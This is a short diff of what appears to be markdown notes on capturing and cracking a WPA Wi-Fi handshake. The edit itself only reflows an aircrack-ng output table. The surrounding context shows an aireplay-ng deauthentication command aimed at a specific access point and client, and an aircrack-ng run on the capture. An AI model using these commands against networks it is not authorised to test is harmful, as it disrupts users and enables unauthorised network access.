@@ -48,8 +48,8 @@ aireplay-ng -0 1 -a 30:94:8F:E8:89:5F -c E4:84:D3:2E:1F:42 wlan0
 aircrack-ng file-01.cap
 ```
 ```text
-  #  BSSID              ESSID                     Encryption
-   1  30:94:8F:E8:89:5F  linksys                WPA (1 handshake)
+#  BSSID              ESSID                     Encryption
+1  30:94:8F:E8:89:5F  linksys                WPA (1 handshake)
 ```
 
 ### Tidy up cap file and reduce size
